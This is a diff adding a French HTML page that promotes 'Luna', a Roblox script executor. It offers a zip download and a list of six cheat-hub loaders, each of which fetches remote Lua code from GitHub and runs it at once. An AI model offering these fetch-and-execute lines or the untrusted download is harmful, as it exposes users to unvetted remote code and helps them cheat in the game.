@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Téléchargez Luna, l'exécuteur de script Roblox. Apprenez à installer et à utiliser Lua sur Roblox pour optimiser vos expériences de jeu.">
+    <meta name="keywords" content="exécuteur de script Roblox, Lua, Luna, télécharger Roblox script">
+    <title>Exécuteur de Script Roblox</title>
+    <style>
+        /* Général */
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: url('https://images6.alphacoders.com/772/thumb-1920-772232.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            overflow-x: hidden;
+            transition: background 0.3s ease;
+        }
+
+        /* Barre de navigation sticky */
+        header {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 100;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        header nav a {
+            color: white;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 1.2em;
+            transition: color 0.3s ease, transform 0.3s ease;
+        }
+
+        header nav a:hover {
+            color: #28a745;
+            transform: scale(1.1);
+        }
+
+        .content {
+            padding: 100px 20px 20px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+            opacity: 0;
+            animation: fadeIn 1s forwards;
+        }
+
+        .hero-image {
+            width: 100%;
+            max-width: 1200px;
+            margin: 20px auto;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .hero-image:hover {
+            transform: scale(1.05);
+        }
+
+        .download {
+            text-align: right;
+            margin-right: 20px;
+            position: relative;
+        }
+
+        .download a {
+            background-color: #28a745;
+            color: white;
+            padding: 12px 20px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 1.1em;
+            transition: background-color 0.3s, transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .download a:hover {
+            background-color: #218838;
+            transform: translateY(-2px);
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Flèche animée */
+        .download .arrow {
+            position: absolute;
+            top: 50%;
+            right: -35px;
+            font-size: 2em;
+            transform: translateY(-50%);
+            animation: bounce 1s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(-50%) translateY(0);
+            }
+            50% {
+                transform: translateY(-50%) translateY(-10px);
+            }
+        }
+
+        section h2 {
+            font-size: 1.6em;
+            margin-bottom: 15px;
+            opacity: 0;
+            animation: fadeIn 1s forwards;
+        }
+
+        section p {
+            font-size: 1.1em;
+            line-height: 1.6;
+        }
+
+        ol {
+            margin-top: 10px;
+            padding-left: 20px;
+        }
+
+        footer {
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            text-align: center;
+            padding: 10px;
+            margin-top: 50px;
+            opacity: 0;
+            animation: fadeIn 1s forwards;
+        }
+
+        /* Animation Fade In */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        /* Grille pour Installation et Vidéo */
+        .install-video-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            align-items: center;
+            margin-top: 30px;
+            opacity: 0;
+            animation: fadeIn 1s forwards;
+        }
+
+        .install-video-grid img {
+            width: 100%;
+            max-width: 600px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .install-video-grid img:hover {
+            transform: scale(1.05);
+        }
+
+        .install-video-grid .video-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .install-video-grid .video-container a {
+            margin-top: 10px;
+            background-color: #0069d9;
+            padding: 12px 20px;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 1.1em;
+            display: inline-block;
+            transition: background-color 0.3s, transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .install-video-grid .video-container a:hover {
+            background-color: #0056b3;
+            transform: translateY(-2px);
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Réactivité */
+        @media (max-width: 768px) {
+            header nav {
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .hero-image {
+                width: 90%;
+                margin: 10px auto;
+            }
+
+            .download {
+                text-align: center;
+                margin: 20px 0;
+            }
+
+            .install-video-grid {
+                grid-template-columns: 1fr;
+                margin-top: 20px;
+            }
+
+            .install-video-grid img {
+                max-width: 100%;
+            }
+
+            footer {
+                margin-top: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Exécuteur de Script Roblox</h1>
+        <nav>
+            <a href="#home" class="nav-link" data-target="home">Home</a>
+            <a href="#installation" class="nav-link" data-target="installation">Comment Installer Luna</a>
+            <a href="#discord" class="nav-link" data-target="discord">Serveur Discord</a>
+            <a href="#script-roblox" class="nav-link" data-target="script-roblox">Script Roblox</a>
+        </nav>
+        <div class="download">
+            <a href="https://github.com/suffz/luna/raw/refs/heads/main/Bootstrapper.zip" download>Télécharger</a>
+            <span class="arrow">→</span>
+        </div>
+    </header>
+
+    <section id="home" class="content">
+        <h2>Qu'est-ce que le script?</h2>
+        <p>
+            Le script est un moyen de dire à l'ordinateur quoi faire. Certains ordinateurs ne comprendront les commandes que si vous lui dites exactement quoi faire, dans des codes spécifiques. Les scripts dans ROBLOX fonctionnent avec un langage de script appelé Lua. Lua n'est pas très difficile à apprendre, dépendant de la manière dont vous voulez l'utiliser.
+        </p>
+        <p>
+            Luna est l'un des meilleurs exécuteurs de script disponibles pour Roblox, et vous pouvez le télécharger directement sur ce site.
+        </p>
+        <img src="https://i.ytimg.com/vi/1mYr8RFxplw/maxresdefault.jpg" alt="Exécuteur de Script Roblox" class="hero-image">
+    </section>
+
+    <section id="installation" class="content">
+        <h2>Comment Installer Luna</h2>
+        <p>
+            Suivez les étapes ci-dessous pour installer Luna Exécuteur :
+        </p>
+        <ol>
+            <li>Téléchargez Luna en cliquant sur le bouton "Télécharger" en haut du site.</li>
+            <li>Ouvrez le fichier téléchargé et suivez les instructions d'installation.</li>
+            <li>Lancez Luna et commencez à exécuter vos scripts Roblox préférés.</li>
+        </ol>
+
+        <div class="install-video-grid">
+            <div class="video-container">
+                <h3>Regardez notre vidéo tutoriel</h3>
+                <p>Apprenez à utiliser Luna avec notre tutoriel vidéo complet :</p>
+                <a href="https://youtu.be/kf_8wesIHL8?si=KJFiYynywO9b4D-y" target="_blank">
+                    <img src="https://th.bing.com/th/id/R.d615fcb54c8d0bc5d367cbba04bb8610?rik=fVRj7cvbxAp9TA&pid=ImgRaw&r=0" alt="YouTube Logo" style="width: 30px; vertical-align: middle; margin-right: 10px;">
+                    Cliquez ici pour voir la vidéo
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <section id="discord" class="content">
+        <h2>Serveur Discord</h2>
+        <p>Rejoignez notre communauté sur Discord pour obtenir de l'aide et discuter avec d'autres utilisateurs :</p>
+        <a href="https://discord.gg/eGD3hDXT" target="_blank">
+            <img src="https://i.pinimg.com/736x/34/91/f3/3491f3e50ab6a4d51a348f9cc2419842.jpg" alt="Discord Logo" style="width: 30px; vertical-align: middle; margin-right: 10px;">
+            Cliquez ici pour rejoindre le serveur Discord
+        </a>
+    </section>
+
+    <section id="script-roblox" class="content">
+        <h2>Script Roblox</h2>
+        <p>
+            Découvrez des scripts Roblox populaires et apprenez à les utiliser avec Luna pour améliorer votre expérience de jeu. 
+            Vous pouvez trouver des ressources et des exemples de scripts qui fonctionnent parfaitement avec Luna ici.
+        </p>
+        <pre>
+            -- REDZ HUB
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
+
+            -- Domandic Hub
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Domadicoof/Domadicoof/main/Domadichub/NottoGay/Start.ranscript"))()
+
+            -- OMG HUB
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
+
+            -- Lures hub
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/xSync-gg/Lures-Hub/main/Get%20Key"))()
+
+            -- Die hub
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/DieScripts7/Die_Hub/main/Die_Hub"))()
+
+            -- Dragon hub
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmadsgamer2/Dragon-Hub/main/Script-Execute.lua"))()
+        </pre>
+    </section>
+
+    <footer>
+        &copy; 2024 Exécuteur de Script Roblox - Tous droits réservés.
+    </footer>
+
+    <script>
+        const links = document.querySelectorAll('.nav-link');
+        const sections = document.querySelectorAll('section');
+
+        links.forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+
+                // Masquer toutes les sections
+                sections.forEach(section => section.style.display = 'none');
+
+                // Afficher la section cible
+                const targetSection = document.getElementById(link.dataset.target);
+                targetSection.style.display = 'block';
+                
+                // Appliquer une animation sur la section active
+                targetSection.style.animation = 'fadeIn 1s forwards';
+            });
+        });
+    </script>
+</body>
+</html>
